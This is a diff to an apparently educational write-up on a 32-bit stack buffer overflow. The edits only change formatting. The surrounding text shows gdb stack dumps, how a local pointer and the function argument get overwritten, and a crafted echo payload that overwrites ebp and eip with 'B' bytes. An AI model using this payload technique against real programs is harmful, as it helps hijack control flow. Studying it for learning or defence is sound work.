@@ -1109,12 +1109,12 @@ to be working as it should.
     Breakpoint 1, 0x080491df in func ()
     (gdb) x/16wx $esp [3]
     0xffffd27c:	0x0804a008	0xffffd284	0x41414141	0x41414141
-    0xffffd28c:	0x41414141	0x41414141	0x41414141 [0xffffd4f2]
-    0xffffd29c:	0xffffd2a8	0x08049201 [0xffffd4f2]	0x00000000
+    0xffffd28c:	0x41414141	0x41414141	0x41414141  0xffffd4f2
+    0xffffd29c:	0xffffd2a8	0x08049201  0xffffd4f2	0x00000000
     0xffffd2ac:	0xf7da1cb9	0x00000002	0xffffd364	0xffffd370
 
-One interesting thing we noticed is that at [1], [2] "$ebp+8"'s value, which the 
-argument to the function is being copied to "$ebp-4", with the latter being related 
+One interesting thing we noticed is that at [1], [2] `$ebp+8`'s value, which the 
+argument to the function is being copied to `$ebp-4`, with the latter being related 
 to the `blah` pointer being placed on the stack and pointing to where our function 
 argument points. At [3] we can confirm what the assembly instructions are showing us. 
 If we attempt to overflow the buffer with something greater than 20, let's say 24, 
@@ -1139,7 +1139,7 @@ one can see that we didn't overwrite much (kind of ...).
 As we can see, junk is printed to the console after the overflow happened. This is because
 the address of the `blah` pointer changed to something non valid "0xffff0842" and data from 
 this memory address is being copied to our sink buffer. But if we look carefully to the 
-function's argument value at "$ebp+8", which was previously equal to "0xffffd4f2", now 
+function's argument value at `$ebp+8`, which was previously equal to "0xffffd4f2", now 
 it's equal to "0xffffd4ee", which came from the fact that we added instead of 20 bytes, 24.
 The difference is 4, so:
 
@@ -1184,7 +1184,7 @@ So our payload should look like:
     $(echo -ne "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\xe6\xd4\xff\xff\x42\x42\x42\x42\x42\x42\x42\x42")
 
 After inspecting with gdb, one can see that the overflow is actually happening and both
-the "$ebp" and "$eip" register values are overflowed with our `B`s.
+the `$ebp` and `$eip` register values are overflowed with our `B`s.
 
     (gdb) run $(echo -ne "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\xe6\xd4\xff\xff\x42\x42\x42\x42\x42\x42\x42\x42")
     The program being debugged has been started already.
